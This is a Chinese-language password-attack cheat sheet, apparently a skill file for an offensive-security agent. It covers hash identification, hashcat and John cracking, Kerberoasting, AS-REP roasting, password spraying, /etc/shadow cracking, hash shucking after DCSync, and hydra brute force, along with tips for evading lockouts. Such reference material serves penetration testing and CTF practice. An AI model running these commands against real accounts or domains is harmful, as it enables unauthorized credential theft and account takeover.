---
name: 'password-attacks'
description: '密码攻击 & Hash 破解：hash识别→hashcat规则/掩码→John→Kerberoast/ASREP→密码喷洒→在线爆破。含决策树。'
whenToUse: '拿到 hash 或需要爆破时：hash 识别→hashcat 规则/掩码→john→Kerberoast/ASREP→密码喷洒。'
metadata: { domain: creds, tier: T1 }
---

# 密码攻击 & Hash 破解

> 🔴 **拿到 hash 第一步：识别类型 → 搜 在线 hash 库（hashes.com） → 查询是否已破解。不要直接跑 hashcat。**

## 0. Hash 识别

```text
hashid <hash>                    # 首选
hash-identifier <hash>          # 备选
hashcat --example-hashes | grep -i <prefix>

# 常见格式速查:
$1$        → MD5 crypt (Linux)
$2a$/2y$   → bcrypt
$5$        → SHA256 crypt
$6$        → SHA512 crypt
$P$        → phpBB/WordPress MD5
$y$        → yescrypt
:1000:     → NTLM (LM:NT 格式)
$krb5tgs$  → Kerberos TGS
$krb5asrep$→ AS-REP hash
$pkinit$   → PKINIT (certipy)
$racf$     → RACF
$ethereum$ → Ethereum
```text

---

## 1. hashcat 核心命令

```text
🔴 分级（Browsed 教训）:
   <1K 候选 → Kali CPU 直接跑（传输+配置 GPU 的成本 > 破解时间）
   1K-1M 候选 → GPU 物理机（RTX 5070 Ti ≈ 1000x Kali CPU）
   >1M 候选 / 掩码 → GPU + 规则，物理机后台跑
# 基础
hashcat -m <mode> <hashfile> <wordlist>
hashcat -m <mode> <hashfile> <wordlist> -r <rule>    # 规则
hashcat -m <mode> <hashfile> -a 3 ?l?l?l?l?d?d       # 掩码攻击
hashcat -m <mode> <hashfile> --show                   # 显示已破解
hashcat -m <mode> <hashfile> -r best64.rule --loopback # 组合迭代

# 常用模式
-m 0      MD5
-m 100    SHA1
-m 1000   NTLM
-m 1400   SHA256
-m 1700   SHA512
-m 1800   SHA512 crypt ($6$)
-m 3000   LM
-m 3200   bcrypt ($2a$)
-m 13100  Kerberos TGS (Kerberoast)
-m 18200  AS-REP Roast
-m 19600  Kerberos TGS (AES128)
-m 19700  Kerberos TGS (AES256)
-m 22000  WPA/WPA2
-m 13400  KeePass
-m 22100  BitLocker
# 🆕 Hash Shucking (NT-candidate)
-m 35300  Kerberos TGS + NT hash corpus (密码复用!)
-m 35400  AS-REP + NT hash corpus
-m 31600  DCC2 + NT hash corpus
```text

### 常用规则

```text
best64.rule          # 通用首选
d3ad0ne.rule         # 大型规则集
OneRuleToRuleThemAll # 社区最强
rockyou-30000.rule   # 生成式
T0XIC.rule           # 中等强度
```text

### 掩码攻击模板

```text
?a                    # 全部字符集 (小写+大写+数字+特殊)
?l?l?l?l?l?l?l?l     # 8位全小写
?u?l?l?l?l?l?d?d     # 1大写+5小写+2数字 (公司密码常见)
?d?d?d?d?d?d?d?d    # 8位全数字
```text

---

## 2. John the Ripper 核心命令

```text
# 基础
john --wordlist=<wordlist> <hashfile>
john --show <hashfile>
john --format=<format> <hashfile>

# 常用格式
--format=NT                   # NTLM
--format=LM                   # LM
--format=Raw-SHA256
--format=crypt                # Linux /etc/shadow
--format=krb5tgs              # Kerberos TGS
--format=krb5asrep            # AS-REP

# SSH 私钥 → john
ssh2john id_rsa > hash.txt
john --wordlist=rockyou.txt hash.txt

# ZIP/RAR/PDF → john
zip2john file.zip > hash.txt
rar2john file.rar > hash.txt
pdf2john file.pdf > hash.txt
```text

---

## 3. Kerberoasting 最佳实践

```text
🔴 AES256 ($krb5tgs$18$*...) → 仅试 rockyou (~5kH/s)，用完即弃转委派
🔴 RC4 ($krb5tgs$23$...)    → 可爆破

# 请求 TGS (🔴 尽量请求 RC4 — AES256 速度极慢但弱密码仍可爆)
impacket-GetUserSPNs DOMAIN/user:pass -request -outputfile hashes.txt
Rubeus.exe kerberoast /outfile:hashes.txt

# 爆破
hashcat -m 13100 hashes.txt rockyou.txt                    # RC4 (快!)
hashcat -m 19700 hashes.txt rockyou.txt                    # AES256 (慢, 仅试 rockyou)
hashcat -m 19600 hashes.txt rockyou.txt                    # AES128 (慢)

# 🆕 Targeted Kerberoast (GenericWrite/GenericAll → 加 SPN → roast → 删 SPN)
# bloodyAD add servicePrincipalName <target_DN> -v 'fake/$(random)'  # 加 SPN
# impacket-GetUserSPNs → hashcat → 破解后 bloodyAD remove servicePrincipalName
```text

---

## 4. AS-REP Roasting

```text
# 无需凭据，用户设置了 DONT_REQ_PREAUTH
impacket-GetNPUsers DOMAIN/ -usersfile users.txt -no-pass -outputfile hashes.txt
impacket-GetNPUsers DOMAIN/user -no-pass  # 指定用户

# 爆破
hashcat -m 18200 hashes.txt rockyou.txt

# netexec
netexec ldap DC_IP -u users.txt -p '' --asreproast output.txt
```text

---

## 5. 密码喷洒

```text
# netexec 喷洒（安全优先：--no-bruteforce 避免锁账户）
netexec smb DC_IP -u users.txt -p 'Spring2025!' --no-bruteforce
netexec smb DC_IP -u users.txt -p passwords.txt --no-bruteforce

# LDAP 喷洒
netexec ldap DC_IP -u users.txt -p 'Password123' --no-bruteforce

# 🔴 先查密码策略！
netexec smb DC_IP -u guest -p '' --pass-pol
netexec ldap DC_IP -u '' -p '' --pass-pol

# 喷洒节奏: 1密码/小时 > 批量
```text

---

## 6. Linux /etc/shadow 破解

```text
# unshadow → 🔴 必须加 --username！否则格式匹配失败
unshadow /etc/passwd /etc/shadow > combined.txt
john combined.txt --wordlist=rockyou.txt
hashcat -m 1800 combined.txt rockyou.txt --username    # $6$
hashcat -m 3200 combined.txt rockyou.txt --username    # $2a$ (bcrypt → 慢!)
```text

---
## 6.5 🆕 Hash Shucking (NT-Candidate)

> 详见 hash-shucking

```text
# 原理: DCSync → 大量 NT hash → 当 wordlist 喂给 Kerberoast/ASREP/DCC2
# 如果匹配 → 该用户跨域/跨服务密码复用！

hashcat -m 35300 kerberoast.txt nt_hashes.txt    # Kerberoast + NT corpus (M hash/s)
hashcat -m 35400 asrep.txt nt_hashes.txt          # AS-REP + NT corpus
hashcat -m 31600 dcc2.txt nt_hashes.txt           # DCC2 + NT corpus
# 🔴 NT-candidate 不爆破 — 直接配对！多域环境密码复用率 40-60%
```text
（NT-candidate 系列详见 hash-shucking 卡）

---

## 7. 密码变异（已知公司策略时）

```text
# 已知: 公司要求 1大写+1数字+1特殊 + 8字符
hashcat --stdout -a 3 "Company?d?d?s" > custom.txt

# 已知: 某用户的旧密码是 Spring2024! → 试 Spring2025!
echo 'Spring2024!' > /tmp/base.txt
hashcat -m 1000 hash.txt -a 6 /tmp/base.txt ?a?a?a?a       # 加后缀 (hybrid)
echo 'Spring2025!' | hashcat -m 1000 hash.txt -r best64.rule # pipe 输入

# 月份/季节替换
printf "Spring\nSummer\nFall\nWinter\nJanuary\nFebruary\n" | while read w; do
  echo "${w}2025!"; echo "${w}2025@"; echo "${w}2026!"
done
```text

---

## 8. 在线破解工具

```text
# hydra
hydra -l user -P passwords.txt ssh://IP
hydra -L users.txt -p 'Password123' smb://IP
hydra -l admin -P passwords.txt http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid"

# medusa
medusa -h IP -u user -P passwords.txt -M ssh

# ncrack
ncrack -p 3389 --user user -P passwords.txt IP

🔴 在线爆破风险: 触发锁定 > 触发告警 > 浪费 VPN 带宽。优先离线爆破！
```text

---

## 快速决策树

```text
拿到 hash → hashid 识别
  ├─ NTLM    → hashcat -m 1000 → 不行 → PtH (不必破解)
  ├─ Kerberos AES → -m 19700 仅试 rockyou (5kH/s) → 不中 → 委派
  ├─ Kerberos RC4 → hashcat -m 13100
  ├─ Linux $6$ → hashcat -m 1800
  ├─ bcrypt   → 浪费时间 (极慢) → 换攻击路径
  ├─ MD5/SHA1 → hashcat 秒破
  └─ 未知格式 → john 自动检测 → 不行 → Google 格式特征
  └─ 🆕 DCSync 后有大量 NT hash → hash-shucking NT-candidate 验证密码复用
```text

## 反模式

| ❌ 禁止 | ✅ 正确 |
|--------|--------|
| ❌ 不识别格式直接跑 hashcat | ✅ 先 hashid |
| ❌ AES256 Kerberoast 死磕一晚上 | ✅ 仅试 rockyou (10分钟) → 不中换委派 |
| ❌ 在线爆破生产环境 | ✅ 离线爆破 / PtH |
| ❌ bcrypt 跑一晚上没结果 | ✅ 换攻击路径 |
| ❌ 密码喷洒不先查锁定策略 | ✅ `--pass-pol` 先 |
